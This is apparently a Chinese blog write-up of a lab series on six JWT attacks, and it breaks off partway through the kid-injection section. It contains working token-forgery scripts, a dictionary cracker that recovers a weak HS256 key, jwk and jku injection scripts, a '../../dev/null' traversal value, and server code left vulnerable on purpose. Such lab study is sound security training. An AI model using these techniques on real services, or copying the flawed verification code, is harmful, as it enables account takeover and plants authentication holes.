---
abbrlink: ''
categories:
- - 无境靶场
date: '2026-11-26T12:39:59.162484+08:00'
tags:
- jwt
title: 无境靶场——JWT 专题
updated: '2026-11-26T12:42:45.955+08:00'
---
## JWT专题一：无效签名验证

### 题目

环境目标：登录"mht"用户，并成功下单一件商品

JWT 由三部分组成：Header.Payload.Signature

服务器生成 JWT 时，会使用一个密钥对头部和载荷进行签名。之后收到客户端发回的 JWT 时，必须验证签名，以确认：

* 令牌确实是由本服务器签发的（而不是伪造的）
* 载荷内容没有被篡改过

如果没有这个验证，任何人都可以随意修改 Payload 部分，再把头部和签名原样拼接回去（甚至替换签名），服务器就会接受这个JWT。

### 解题

题目似乎是要我们伪造一个 jwt，进行下单，下单成功后即可返回 flag

1. 打开 url，是一个商城界面

![image](https://img2.eval.moe/image-20260630000615-13fibcc.png)

2. 购买东西提示要先登录

![image](https://img2.eval.moe/image-20260630000703-qqm61el.png)

3. 我们注册了个用户 aaa，注意，注册的时候的相应包就是我们的 jwt

![image](https://img2.eval.moe/image-20260630000807-3qugsmn.png)

4. 拿到在线网站去解码，发现是这样的，username 是我们的用户名，iat 是我们注册时的时间戳？（不确定）

![image](https://img2.eval.moe/image-20260630000835-2kr1t4z.png)

5. 继续下单，下单的时候提示用户余额不足

![image](https://img2.eval.moe/image-20260630000734-6nmnjym.png)

6. 在结账这个接口我们又看到了 jwt

![image](https://img2.eval.moe/image-20260630000939-mjfxcxy.png)

7. 思路现在就很明确了，我们知道了我们的 jwt 结构，可以伪造一个 admin 用户的 jwt，然后进行下单，现在利用在线网站生成一个 jwt

![image](https://img2.eval.moe/image-20260630001322-7eiv47n.png)

8. 抓包，替换 jwt

![image](https://img2.eval.moe/image-20260630001409-24a56du.png)

9. 啊？提示登录状态无效？

![image](https://img2.eval.moe/image-20260630001459-ck0aufi.png)

到这里的时候我一直没想明白，为什么这样都没法伪造成功，然后去看了一下 b 站的视频，视频链接：https://www.bilibili.com/video/BV1QkRYYREQK/?spm\_id\_from=333.1391.0.0&vd\_source=189e78d8fb3a35dc30e5a63e8045d528

到这里我才恍然大悟，原来是直接 jwt 的 header、payload、Signature 三段都是 base64 加密的，然后导致无效签名验证的原因是开发人员在验证 jwt 的时候用的是 decode 方法，而非 verfity 方法，导致了攻击者可以恶意修改 payload 字段并重新编码成 jwt。

我失败的原因就是不了解业务场景，以为是用 jwt 直接重新生成一个，密钥随便填那种，下次还是得先了解一下业务场景之类的再来开始做题

### 重新做题

1. 这里写了个脚本伪造 jwt

```python
import base64

import jwt

# 登录 aaa 用户时颁发的 jwt
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhYSIsImlhdCI6MTc4MjgzNzM1Mn0.rYV0fs0hHhX8WWvK8GrXiGt6Gyvp35pVKGifV8WiR4AsLEcHp0bSUWsRLFbJjDBr3DI5es5gKxDNdXIrX5BEXS-pWML-DsEeqsx7JYDYWMmmsRgbKoTKMYddHF2UW97b0xzsz84dK_Vt97xM04H8Ibwmr2mxIlKARN3FIgzzXvWCNdRRwso_jBz0Tw0zMql9IrfTxl060-qGXyfFu3ZdjnuCvp87mqY7sU9MbgEvj-6gO9_qyqbig_t2e8T5VDEeHweecct-npXqgTtNLr6-7siB7zVwc4RlSejiIssZOHwzpmapjFDwVla__Gj5vtkqs0Td8YkWs9apr1PhJwsUig"

# 解码后的 payload
payload = jwt.decode(token, options={"verify_signature": False})
print(payload)

# 手动修改 payload
header, payload, signature = token.split(".")
decode_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
decode_payload = decode_payload.replace(b'aaa', b'mht')
print(decode_payload)

# 重新编码 jwt
modified_payload_b64 = base64.urlsafe_b64encode(decode_payload).rstrip(b'=').decode()
new_jwt = f"{header}.{modified_payload_b64}.{signature}"
print(new_jwt)
```

2. 用重新编码的 jwt 访问个人中心，发现伪造成功

![image](https://img2.eval.moe/image-20260701011838-hnyf7j0.png)

3. 成功下单

![image](https://img2.eval.moe/image-20260701012010-w79qjd7.png)

## JWT专题二：无签名令牌绕过

### 题目

环境目标：登录"mht"用户，并成功下单一件商品

JWT（JSON Web Token）的结构包含三部分：标头（Header）、载荷（Payload） 和 签名（Signature）。标头中的 alg 参数告知服务器该令牌使用了哪种签名算法（如 HS256、RS256）。正常情况下，服务器会使用这个算法验证签名，确保令牌未被篡改。

漏洞本质：信任用户输入的算法
alg 参数来自未经验证的令牌本身，服务器直接信任它并决定验证行为。攻击者可以操纵这个参数，将 alg 设为 none，表示该令牌没有签名。规范中定义 none 算法用于“未受保护的JWT”，本意是在某些非安全场景下使用，但若服务器错误地允许 none 令牌，就会发生以下情况：

攻击者可以任意修改令牌的标头和载荷（如改变用户ID、角色、过期时间等）。
服务器看到 alg: none 后，跳过签名验证，直接接受令牌内容为有效。
因为没有任何签名需要校验，任何伪造的令牌都能通过。

### 示例业务场景：极客书店管理后台

**背景**：你是一名安全测试人员，目标系统是一个小型在线书店。系统使用JWT进行身份认证，但后端在验证逻辑上存在缺陷。你的任务是登录 `mht` 用户，并成功下单购买《黑客守则》这本书。

假设我们是白盒测试的，可以拿到源码，我们看源码发现 jwt 是正常登录时签发的

![image](https://img2.eval.moe/image-20260701012736-eg9am1w.png)

但是在解码 jwt 的时候直接相信了客户端发来的头部，导致了该漏洞

![image](https://img2.eval.moe/image-20260701012846-j4zt8v7.png)

### 解题

1. 可以看到注册的时候是正常签发 jwt 的

![image](https://img2.eval.moe/image-20260701013032-y5xe13d.png)

2. 拿到 jwt.io 里看看 jwt 信息

![image](https://img2.eval.moe/image-20260701013126-nb5zt9d.png)

3. 直接在 jwt.io 伪造一个 jwt，头部签名算法改为 none，这样会跳过签名验证，直接接受内容为有效

![image](https://img2.eval.moe/image-20260701013301-27d7rl3.png)

4. 抓包改 jwt，改成我们生成的这个，先在个人中心试验一下，可以看到余额为 1000，说明服务端直接判断我们生成的 jwt 为有效了

![image](https://img2.eval.moe/image-20260701013445-nvdc5kg.png)

5. 购买商品成功

![image](https://img2.eval.moe/image-20260701013630-n3fi83b.png)

## JWT专题三：弱密钥

### 题目

环境目标：登录"mht"用户，并成功下单一件商品

一些签名算法，例如 HS256 签名算法使用弱密钥进行签名和验证。如果开发者在代码中使用了默认密码、示例密钥（如 secret、key、123456）或从网上直接复制的硬编码值，攻击者就可以将这些已知的弱密钥编成“字典”，对截获的 JWT 尝试本地签名比对。由于只需离线计算 HMAC-SHA256 并与令牌中的签名部分匹配，无需与服务器交互。拿到密钥后，攻击者便能任意伪造具有完整有效签名的 JWT，从而冒充任何用户、提升权限，彻底绕过认证体系。

### 业务场景

这个我感觉没必要说，如题目说的就是

### 前置知识——容易被爆破的算法：HS256 / HS384 / HS512（对称加密家族）

这三种算法本质上都是 **HMAC**（Hash-based Message Authentication Code），使用**同一个密钥**进行签名和验证。


| 算法  | 底层哈希函数 | 密钥类型 |
| ----- | ------------ | -------- |
| HS256 | HMAC-SHA256  | 对称密钥 |
| HS384 | HMAC-SHA384  | 对称密钥 |
| HS512 | HMAC-SHA512  | 对称密钥 |

**为什么它们容易被爆破？**

**1. 签名计算成本极低**

HMAC 的计算公式大致是：

text

```
HMAC(K, m) = H((K ⊕ opad) || H((K ⊕ ipad) || m))
```

本质就是两次哈希运算。在普通笔记本上，每秒可以计算**数百万次** HMAC-SHA256。这意味着攻击者可以用一个包含数百万常见弱密码的字典，在几分钟内完成离线爆破。

**2. 离线攻击，无任何限制**

爆破过程完全不与服务器交互：

* 截获一个合法 JWT → 提取 Header 和 Payload → 用自己的弱密码字典逐个计算签名 → 对比签名部分
* 服务器完全感知不到，没有登录失败锁定、没有频率限制、没有IP封禁

### 解题

1. 依旧先注册用户，取 jwt

```python
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhYSIsImlhdCI6MTc4Mjg0MTMxNH0.hwDcP99nDnssfRmejzBuy6GU2tMdhH1ujSlhN_PBD90
```

2. 看到 jwt 密钥的算法是 HS256，可以爆破

![image](https://img2.eval.moe/image-20260701014334-g1xb0j4.png)

3. ai 生成一个爆破密钥的脚本

```python
import jwt
import argparse

# ===== JWT 弱密钥爆破脚本 =====
# 适用于 HS256/HS384/HS512 算法
# 攻击者截获目标JWT后，用字典离线尝试，匹配签名即找到密钥

def jwt_cracker(token, wordlist_path):
    """
    token: 截获的完整JWT字符串
    wordlist_path: 弱密码字典文件路径，每行一个密钥
    """
    # 分离JWT的Header和Payload（不需要解析内容，直接拼回去签名即可）
    header_b64, payload_b64, sig_b64 = token.split('.')

    # 读取字典文件
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        words = [line.strip() for line in f if line.strip()]

    print(f"[*] 目标JWT: {token[:50]}...")
    print(f"[*] 字典加载 {len(words)} 个密钥，开始爆破...\n")

    # 遍历字典，逐个尝试
    for idx, secret in enumerate(words):
        try:
            # 用当前密钥重新签名 Header.Payload
            forged = jwt.encode(
                jwt.api_jwt.decode_complete(token, options={"verify_signature": False})["payload"],
                secret,
                algorithm="HS256",  # 可改为HS384/HS512
                headers=jwt.get_unverified_header(token)  # 保留原始Header
            )

            # 提取签名部分，直接字符串比对
            if forged.split('.')[2] == sig_b64:
                print(f"[+] 密钥找到! 行号:{idx+1} -> {secret}")
                return secret

        except Exception:
            continue  # 某些字符可能导致编码问题，跳过

        # 每1000次打印进度
        if (idx + 1) % 1000 == 0:
            print(f"[-] 已尝试 {idx+1}/{len(words)}...", end='\r')

    print("\n[!] 字典中未找到匹配密钥。")
    return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT HS256 弱密钥爆破工具")
    parser.add_argument("-t", "--token", required=True, help="目标JWT字符串")
    parser.add_argument("-w", "--wordlist", required=True, help="弱密码字典路径")
    args = parser.parse_args()

    jwt_cracker(args.token, args.wordlist)
```

4. 写了个脚本进行对弱密钥进行爆破

```python
import jwt

jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhYSIsImlhdCI6MTc4Mjg0MTMxNH0.hwDcP99nDnssfRmejzBuy6GU2tMdhH1ujSlhN_PBD90"
wordlist_file = "rockyou.txt"

def attempt_fuzzing(secret_key, algorithm):
    try:
        decoded = jwt.decode(jwt_token, secret_key, algorithms=[algorithm])
        print(f"[!]Key found: {secret_key}")
        print(f"Decoded payload: {decoded}")
        return True
    except jwt.InvalidSignatureError:
        return False

def fuzz_secret_key(wordlist_file):
    header = jwt.get_unverified_header(jwt_token)
    algorithm = header.get('alg')
    if not algorithm:
        print("[!] No algorithm specified")
        return None
    else:
        print(f"[!] Algorithm found: {algorithm}")
    with open(wordlist_file, "r") as f:
        for line in f:
            secret_key = line.strip()
            if attempt_fuzzing(secret_key, algorithm):
              return secret_key
        return None

if __name__ == '__main__':
    found_secret_key = fuzz_secret_key(wordlist_file)
    if found_secret_key:
        print(f"Secret key found: {found_secret_key}")
    else:
        print(f"Secret key not found")


```

输出：

```python
[!] Algorithm found: HS256
[!] Key found: 123456
Decoded payload: {'username': 'aaa', 'iat': 1782841314}
Secret key found: 123456
```

有长度警告不用管

5. 在 jwt.io 使用该密钥重新生成一个 jwt

![image](https://img2.eval.moe/image-20260701020457-7m3bapb.png)

6. 使用该 jwt 购买商品，购买成功！

![image](https://img2.eval.moe/image-20260701020445-ok6wv08.png)

## JWT专题四：头部参数注入

### 题目

环境目标：登录"mht"用户，并成功下单一件商品

配置不当的服务器在验证签名时：

没有使用受信任的密钥白名单。

而是直接从收到的 JWT 头部中提取 `jwk` 字段，把它当作合法的公钥去验签。

> **JWK（JSON Web Key）** 是一种用 JSON 格式表示加密密钥的标准规范，它的核心作用很简单：**把密钥（公钥或私钥）用结构化的 JSON 来描述，方便在不同系统间传输和存储。**

### 前置知识

在 jwt 规范中，只有 alg 字段是必须的，其他的都是可选参数，其中 `jwk` 字段可嵌入一个完整的公钥。如果服务器盲目信任并直接用它验签，攻击者就能自签密钥、伪造任意身份。

![image](https://img2.eval.moe/image-20260701021331-ltjzhzi.png)

### 业务场景——业务场景：云端书店 API

**背景**：某在线书店为了“灵活”支持多租户 OAuth，允许 JWT 头部携带 `jwk`（JSON Web Key）字段。服务器会动态从令牌头部提取公钥来验证签名，而不是使用本地白名单。攻击者可以自签一个 JWT，在头部嵌入自己的 JWK，让服务器误认为合法。

示例代码段：

```javascript
    // 检查头部是否携带了jwk
    if (header.jwk) {
      console.log(`[!] 发现jwk头部参数，直接信任并使用该公钥验签！`);
    
      // 将JWK格式转换为PEM公钥
      const publicKeyFromJwk = await jose.importJWK(header.jwk, header.alg || 'RS256');
      const publicKeyPem = publicKeyFromJwk.export({ type: 'spki', format: 'pem' });

      // 直接用攻击者提供的公钥验证签名
      const decoded = jwt.verify(token, publicKeyPem, { algorithms: ['RS256', 'HS256', 'ES256'] });

      req.user = decoded;
      console.log(`[+] 验签通过（使用jwk提供的公钥），用户: ${decoded.username}`);
      return next();
    }

    // 如果没有jwk，使用默认公钥
    const defaultPublicKey = publicKey.export({ type: 'spki', format: 'pem' });
    const decoded = jwt.verify(token, defaultPublicKey, { algorithms: ['RS256'] });
```

### 解题

1. 依旧注册用户看 jwt 密钥，发现算法是 RS256

![image](https://img2.eval.moe/image-20260701022435-j9sojsf.png)

2. 我们先用命令生成一对密钥，先生成私钥

```cmd
openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

解释：
这条命令的意思是：生成一个 2048 位的 RSA 私钥，保存到 private_key.pem 文件中。

逐段拆解：

genpkey — 生成私钥（general private key）

-algorithm RSA — 指定算法为 RSA

-pkeyopt rsa_keygen_bits:2048 — 密钥长度 2048 位

-out private_key.pem — 输出到 private_key.pem

相比旧命令 genrsa，genpkey 是 OpenSSL 推荐的通用密钥生成方式，支持更多算法。
```

再使用

```cmd
openssl rsa -in private_key.pem -pubout -out public_key.pem

解释：
读取并解析私钥文件 private_key.pem，根据私钥生成 public_key.pem 到当前目录
-pubout — 提取公钥

-out public_key.pem — 输出到当前目录的 public_key.pem
```

3. 使用脚本重新生成 jwt，脚本来自：https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/jwt/4\_jwk\_header\_injection.py

```python
# Demo script for 'JWT Authentication Bypass via jwk Header Injection' video: https://youtu.be/t-RfzyW0iqA
import jwt
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Step 1: Take a JWT and decode it
token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6InN0b3JlLXJzMjU2LWtleS0xIn0.eyJ1c2VybmFtZSI6ImFhYSIsImlhdCI6MTc4Mjg0MzgyNn0.XoOHOVR4nvbNLiv3G8ZMgEZgJeGQzVd1l5IS7Se27J3utT0_iofu59r_FYnLAGkcruu3z-R80g-aV3ioMbhneLEr3UMFcZSltCgs6QzQBJBZ2lsjx9Ni4b13CN1Cq-XD4UNxiEEY8faFzlp8x_BGCykQKSNj-LGJojievGrnCBgWLewPrSR5bvHAcTMrM7JnVJ3JxRiKIk18evS9E-KgFeR5o8re5D3GjFNaCxul2DHx3WmPqlhX1uIQYed5R_un_dWcemVw4l1GC0ryYSxcySS9CQbK7_A8sopfB-YQ7jssj_4u3M-Hm0wrrxmynlDDwSNzbaYZDbQSIVc5PH_J9A'

# Step 2: Verify the JWT signature
with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

# Step 3: Decode the JWT
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}")
decoded_header = jwt.get_unverified_header(token)
print(f"Decoded header: {decoded_header}\n")

# Step 4: Modify the token (JWT manipulation)
decoded_token['username'] = 'mht'
print(f"Modified token: {decoded_token}\n")

# Step 5: Sign the modified JWT using your RSA private key and embed the public key in the JWK header
with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Extract the necessary information from the private key
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

# Build the JWK header
jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
}

# Step 6: Generate the modified token
modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jwk': jwk, 'kid': decoded_header['kid']})

# Print the modified token header
print(f"Modified header: {jwt.get_unverified_header(modified_token)}\n")

# Print the final token
print("Final Token: " + modified_token)
```

输出：

```python
Decoded token: {'username': 'aaa', 'iat': 1782843826}
Decoded header: {'typ': 'JWT', 'alg': 'RS256', 'kid': 'store-rs256-key-1'}

Modified token: {'username': 'mht', 'iat': 1782843826}

Modified header: {'alg': 'RS256', 'jwk': {'e': 'AQAB', 'kid': 'store-rs256-key-1', 'kty': 'RSA', 'n': 'nx2fuoKPZBF0sh0p2Mu8eqlUa2bpflVgxUQFZ94c9xD81FvnOV0n7wginIyNGilDfRZoXHd-m3ClPNLLenb4KM9nGQg_6l1qVjJgrXOe45PVcFTj3pPw-kLiK10bmkQUbdn4UNUVYIvswGrXLDqORUevw2RCEilfHK9Ae3PUHY5B99WTLHRioRbfytYxRLcxJj6_Qv6d7BcFOzspu1jaOW-fPY2CscWfY14Y3m-Ihm_d_4troS1qsz576rwyTr6_6VLo-VTu6vJ3SaHQVGqJImXN3H9djuXHIGUCVtOV-dIPGm0jYTmnEBxFM_zWfGqt6gnPY29OCZnXEhP7E54rvw'}, 'kid': 'store-rs256-key-1', 'typ': 'JWT'}

Final Token: eyJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImtpZCI6InN0b3JlLXJzMjU2LWtleS0xIiwia3R5IjoiUlNBIiwibiI6Im54MmZ1b0tQWkJGMHNoMHAyTXU4ZXFsVWEyYnBmbFZneFVRRlo5NGM5eEQ4MUZ2bk9WMG43d2dpbkl5TkdpbERmUlpvWEhkLW0zQ2xQTkxMZW5iNEtNOW5HUWdfNmwxcVZqSmdyWE9lNDVQVmNGVGozcFB3LWtMaUsxMGJta1FVYmRuNFVOVVZZSXZzd0dyWExEcU9SVWV2dzJSQ0VpbGZISzlBZTNQVUhZNUI5OVdUTEhSaW9SYmZ5dFl4UkxjeEpqNl9RdjZkN0JjRk96c3B1MWphT1ctZlBZMkNzY1dmWTE0WTNtLUlobV9kXzR0cm9TMXFzejU3NnJ3eVRyNl82VkxvLVZUdTZ2SjNTYUhRVkdxSkltWE4zSDlkanVYSElHVUNWdE9WLWRJUEdtMGpZVG1uRUJ4Rk1feldmR3F0NmduUFkyOU9DWm5YRWhQN0U1NHJ2dyJ9LCJraWQiOiJzdG9yZS1yczI1Ni1rZXktMSIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1odCIsImlhdCI6MTc4Mjg0MzgyNn0.BYRs6nW0DVTOguIZypwzihHYs4vOYMaG1ezcOms3wK0q_c_DVnoOlAcx-227zK-vOCkwzrYLaR92AqZXi4PhtK8nOQg23NKmejipmlIpDK3Dz8q1pStm-r4iRBD-2NhqSjMEgaDyI3KCqFqNOIbze859IMUbcKdS2ZFb_OZ2gJb1wEh2NsUf_Vr2HLU8bjdv32WaIbq5E3SQ0DfVej8M-AjOXqzdZPG97lCYLu75Y0VziWwPFZpAxGX-NaWL4OcCMhoyuV0TbWnUTt9AjmfKmog8JzQ4ZPDi4QDhj8W5Z0vbREDIxbvO1fiYXjs767WmlHyu1pLAjSVevV8x3p0_Fw

```

4. 替换 jwt，完成

![image](https://img2.eval.moe/image-20260701024032-ptrqae8.png)

## JWT专题五：jku头部注入绕过

### 题目

环境目标：登录"mht"用户，并成功下单一件商品

核心是服务端信任了 JWT 头部里的 jku 参数。

攻击者可以把 jku 指向自己控制的 JWKS 地址，然后用自己的私钥签一个伪造的管理员 JWT。服务端验签时会去这个地址拉取攻击者的公钥，结果反而把攻击者签的 token 当成合法 token。

> jku 是一个指向密钥集的 url，服务器可以从该 url 获取包含正确密钥的一组密钥，kid 是密钥 id。
> jwk 集合是一个包含表示不同密钥的 jwk 数组的 json 对象，以下示例为一个 jwk 集合：
>
> ![image](https://img2.eval.moe/image-20260701233518-wltcasv.png)
>
> 像这样的 jwk 集合一般都会有一个标准端点公开暴露：/.well-known/jwks.json，更安全的网站只会从受信任域里获取

### 业务场景：微服务架构的电商平台

**背景**：某电商平台采用微服务架构，认证服务签发 JWT，各个业务服务通过 `jku` 字段动态获取 JWKS 公钥验签。但订单服务没有对 `jku` 做白名单限制，攻击者可以将其指向自己搭建的 JWKS 端点。

正常签发 jwt![image](https://img2.eval.moe/image-20260701232541-pnpmj42.png)

漏洞代码：

```javascript
    // 不解码验证，先获取头部信息
    const decodedHeader = jwt.decode(token, { complete: true })?.header;

    if (!decodedHeader) {
      return res.status(403).json({ msg: '令牌格式错误' });
    }

    console.log(`[!] JWT Header:`, JSON.stringify(decodedHeader));

    // =============================================
    // 漏洞：如果头部有jku，就去这个地址拉取JWKS
    // =============================================
    let publicKeyForVerify;

    if (decodedHeader.jku) {
      console.log(`[!] 发现jku字段: ${decodedHeader.jku}`);
      console.log(`[!] 从攻击者可控的URL获取JWKS...`);

      // 直接信任jku，没有任何白名单检查
      const client = jwksClient({
        jwksUri: decodedHeader.jku,  // 攻击者完全可控！
        cache: false                  // 禁用缓存，每次都拉取
      });

      // 根据kid获取密钥
      const kid = decodedHeader.kid || '';
      const key = await client.getSigningKey(kid);
      publicKeyForVerify = key.getPublicKey();

      console.log(`[+] 从jku获取公钥成功，kid: ${kid}`);
```

### 解题

1. 照常注册用户，然后看 jwt 结构

![image](https://img2.eval.moe/image-20260701232739-fpizl6z.png)

2. 生成私钥，再通过私钥提取公钥

```javascript
openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

解释：
这条命令的意思是：生成一个 2048 位的 RSA 私钥，保存到 private_key.pem 文件中。

openssl rsa -in private_key.pem -pubout -out public_key.pem

解释：
读取并解析私钥文件 private_key.pem，根据私钥生成 public_key.pem 到当前目录
```

3. 写脚本，当然也可以用别人的脚本，其中 jku\_url 里写自己服务器的地址，待会把自己的 jwk 放进去

```javascript
# Demo script for 'JWT Authentication Bypass via jku Header Injection' video: https://youtu.be/hMRdMmll8Bk
import jwt
import base64
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Take a JWT and JKU URL as input
token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6InN0b3JlLXJzMjU2LWtleS0xIn0.eyJ1c2VybmFtZSI6ImFhYSIsImlhdCI6MTc4MjkxOTYyMn0.gWr1qEATBkN0c4qQm10UtKcDh9_gOi3On0HfMAiBAR0KeMvVGXBs5rQQMrbicKoXfHpLrS323MbJMqqqUCy6sWvFU3d9D5Ux5D-jtk0BOY-BSuFf2LLNkYY7_ocr_4faKI5N8V1bzC7Qkxl6vu-Jnmoj9i-x76z4rIeRjHjz8KBWTe3tgPO7YfF7kdNpDfe6Xr0-9cI7e1JAuZTfEbCc0KmSRrw2Tv2Xntgc_xgkcp-ZYN9OCqZ_PCaPkjo_ljKFCZ6iyy-TsioZyubFrT9LULbaGNpy123A41vxAR0uOQ3wywFSC4PPsUjz51q5gzWjUDJFIwy6EuB9Cur4lmKzSw'
jku_url = 'https://your-server/jwks.json'

# Load and serialize the public key
with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

# Decode the JWT
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")
decoded_header = jwt.get_unverified_header(token)
print(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}\n")

# Modify the token (JWT manipulation)
decoded_token['username'] = 'mht'
print(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")

# Sign the modified JWT using your RSA private key
with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Extract the necessary information from the keys
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

# Build the JWKs
jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
}
keys = {"keys": [jwk]}
print(f"JWK:\n{json.dumps(keys, indent=4)}\n")

# Generate the modified token
modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jku': jku_url, 'kid': jwk['kid']})

# Print the modified token header
print(f"Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")

# Print the final token
print("Final Token: " + modified_token)
```

输出：

```javascript
Decoded token:
{
    "username": "aaa",
    "iat": 1782919622
}

Decoded header:
{
    "typ": "JWT",
    "alg": "RS256",
    "kid": "store-rs256-key-1"
}

Modified token:
{
    "username": "mht",
    "iat": 1782919622
}

JWK:
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "store-rs256-key-1",
            "n": "nx2fuoKPZBF0sh0p2Mu8eqlUa2bpflVgxUQFZ94c9xD81FvnOV0n7wginIyNGilDfRZoXHd-m3ClPNLLenb4KM9nGQg_6l1qVjJgrXOe45PVcFTj3pPw-kLiK10bmkQUbdn4UNUVYIvswGrXLDqORUevw2RCEilfHK9Ae3PUHY5B99WTLHRioRbfytYxRLcxJj6_Qv6d7BcFOzspu1jaOW-fPY2CscWfY14Y3m-Ihm_d_4troS1qsz576rwyTr6_6VLo-VTu6vJ3SaHQVGqJImXN3H9djuXHIGUCVtOV-dIPGm0jYTmnEBxFM_zWfGqt6gnPY29OCZnXEhP7E54rvw"
        }
    ]
}

Modified header:
{
    "alg": "RS256",
    "jku": "https://freeaes.com/jku.json",
    "kid": "store-rs256-key-1",
    "typ": "JWT"
}

Final Token: eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZnJlZWFlcy5jb20vamt1Lmpzb24iLCJraWQiOiJzdG9yZS1yczI1Ni1rZXktMSIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1odCIsImlhdCI6MTc4MjkxOTYyMn0.GaKWxnNS1YDgOMzsQ0hPqS9poqmt-XCEn_SMj3rTVMh2y_JUyKhGZm6E8jFRIj3Xd6vZ_ejP3V2PZawGoYCIaho1KOrSdE36IxRwlHlwhiFQe0U6nD7Vvl9SXDYVTgEglGa-EdFBGDIL5g7JjWwZLciUbzsqrgLiF_bC3jOiB5QtSRXLZXgFfeGGCBfBPD26leT770fNfK3AEgx20ihWc6zY38YVwg6L3BYZQ3m3JaweiD7TfBWFLlVp8_vBzrX4vtop8doAzR4_D_ON2PfCmXoXzzzINC6W2N4LU4pMxGFFHjASHLrVy5Rv6k7_HqKZxGT7G717ljF0HRDb1MOvQA
```

4. 我们将重新生成的 token 放到 jwt.io 解析可以看到里面有 jku

![image](https://img2.eval.moe/image-20260701235621-p0ado3e.png)

5. 将生成的 jwk 放到服务器上，确保可以公网访问

![image](https://img2.eval.moe/image-20260701234945-8etfe24.png)

6. 使用该 jwt 查看个人中心信息，证明伪造成功

![image](https://img2.eval.moe/image-20260701235750-p5et3hc.png)

7. 拿下 flag

![image](https://img2.eval.moe/image-20260701235914-seoexrz.png)

## JWT专题六：kid 参数注入

### 题目

环境目标：登录"mht"用户，并成功下单一件商品

核心是服务端直接信任 JWT header 里的 kid，并把它拼接成文件路径读取验签密钥。

由于 kid 没有做白名单和目录穿越过滤，攻击者可以设置为 ../../dev/null，让服务端读取空文件作为密钥，同时服务端使用 HS256 对称算法，攻击者用空字符串重新签名 JWT，就能伪造任意用户身份。

### 业务场景：多密钥轮换的电商系统

假设我们有一个电商平台，为了增强安全性，系统定期进行**密钥轮换 (Key Rotation)**，或者这是一个**多租户系统 (Multi-tenant)**，每个大客户拥有自己的签名密钥。

为了实现这一点，开发人员将每个时期的 HMAC 密钥保存在服务器本地的 `/var/app/keys/` 目录下（例如 `key-2026-v1.txt`，`key-2026-v2.txt`）。

当用户发起结账下单（`/api/order`）请求时，服务端会：

1. 先提取 JWT 的 Header，读取里面的 `kid` 字段。
2. 将 `/var/app/keys/` 与 `kid` 的值**直接拼接**，去读取对应的密钥文件。
3. 用读取到的文件内容作为 Secret 来验证 JWT 的合法性。

关键源码：

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');
const app = express();

// 模拟的密钥存放目录: /var/app/keys/
const KEYS_DIR = path.join(__dirname, 'keys'); 

// 鉴权中间件
function authenticate(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader) return res.status(401).send("Missing Token");
  
    const token = authHeader.split(' ')[1];

    try {
        // 【漏洞点 1】不验证签名的前提下，直接解码 Header
        const decodedHeader = jwt.decode(token, { complete: true }).header;
        const kid = decodedHeader.kid;

        if (!kid) return res.status(400).send("Missing kid in JWT Header");

        // 【漏洞点 2】没有过滤目录穿越符 (../)，直接拼接文件路径
        // 如果 kid 是 "../../../../../dev/null"，filePath 就会变成系统空文件
        const filePath = path.join(KEYS_DIR, kid);

        // 读取密钥文件内容
        const secretKey = fs.readFileSync(filePath);

        // 【漏洞点 3】使用读取到的密钥（可能为空）来验证签名
